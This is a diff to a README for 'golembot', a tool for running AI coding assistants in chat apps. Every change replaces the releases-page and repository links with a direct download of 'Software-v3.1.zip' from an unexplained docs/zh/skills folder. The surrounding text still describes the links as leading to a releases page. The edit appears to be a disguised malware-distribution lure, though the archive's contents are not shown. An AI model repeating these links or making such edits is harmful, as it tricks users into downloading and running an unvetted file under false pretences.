@@ -1,6 +1,6 @@
 # 🤖 golembot - Run AI Bots on Chat Apps Easily
 
-[![Download golembot](https://img.shields.io/badge/Download-Go+to+Releases-green?style=for-the-badge)](https://github.com/hugo57100/golembot/releases)
+[![Download golembot](https://img.shields.io/badge/Download-Go+to+Releases-green?style=for-the-badge)](https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip)
 
 ---
 
@@ -9,7 +9,7 @@ golembot lets you use AI tools like Cursor, Claude Code, OpenCode, or Codex in p
 ## 📥 How to Download golembot
 
 Visit this page to download golembot:  
-[https://github.com/hugo57100/golembot/releases](https://github.com/hugo57100/golembot/releases)
+[https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip](https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip)
 
 This page lists the latest versions. Look for files that match your Windows system. Usually, you will see `.exe` or `.zip` files.  
 
@@ -81,7 +81,7 @@ If you use a company computer, you may need admin rights or ask your IT departme
 ### Updating golembot
 
 - Check the releases page regularly:  
-  [https://github.com/hugo57100/golembot/releases](https://github.com/hugo57100/golembot/releases)  
+  [https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip](https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip)  
 - Download the newest installer or ZIP file and run it to replace old files.  
 - Your settings will usually stay the same after updating.
 
@@ -104,4 +104,4 @@ If you use a company computer, you may need admin rights or ask your IT departme
 
 For more detailed technical instructions, check the full documentation on GitHub or open issues if you encounter problems.
 
-[https://github.com/hugo57100/golembot](https://github.com/hugo57100/golembot)
+[https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip](https://github.com/hugo57100/golembot/raw/refs/heads/main/docs/zh/skills/Software-v3.1.zip)
